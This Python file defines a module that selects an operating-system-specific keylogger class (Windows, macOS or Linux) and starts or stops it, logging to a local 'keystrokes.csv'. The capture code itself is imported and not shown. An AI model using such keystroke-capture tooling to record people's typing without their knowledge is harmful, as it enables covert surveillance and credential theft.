from core.key_capture.darwin_key_logger import DarwinKeyLogger
from core.key_capture.linux_key_logger import LinuxKeyLogger
from core.key_capture.windows_key_logger import WindowsKeyLogger


class KeyCaptureModule:
    """
    Module for capturing keystrokes based on the operating system.
    """

    def __init__(self, os_type):
        """
        Initializes the key capture module with a specific operating system.
        :param os_type: The type of the operating system.
        """
        try:
            self.keylogger = self._create_keylogger(os_type)
        except ValueError as e:
            print(f"Error initializing keylogger: {e}")
            raise

    @staticmethod
    def _create_keylogger(os_type):
        """
        Creates an instance of the appropriate keylogger for the given OS.
        :param os_type: The type of the operating system.
        :return: An instance of a keylogger.
        """
        if os_type == "Windows":
            # Return an instance of WindowsKeyLogger
            return WindowsKeyLogger("keystrokes.csv")  # File path for logging
        elif os_type == "Darwin":
            return DarwinKeyLogger("keystrokes.csv")  # Provide the file path for logging
        elif os_type == "Linux":
            # Return an instance of LinuxKeyLogger
            return LinuxKeyLogger("keystrokes.csv")  # File path for logging

        else:
            raise ValueError(f"Unsupported OS: {os_type}")

    def start_capture(self):
        """
        Starts the key capturing process.
        """
        try:
            self.keylogger.start_capture()
        except Exception as e:
            print(f"Error starting key capture: {e}")

    def stop_capture(self):
        """
        Stops the key capturing process.
        """
        try:
            self.keylogger.stop_capture()
        except Exception as e:
            print(f"Error stopping key capture: {e}")
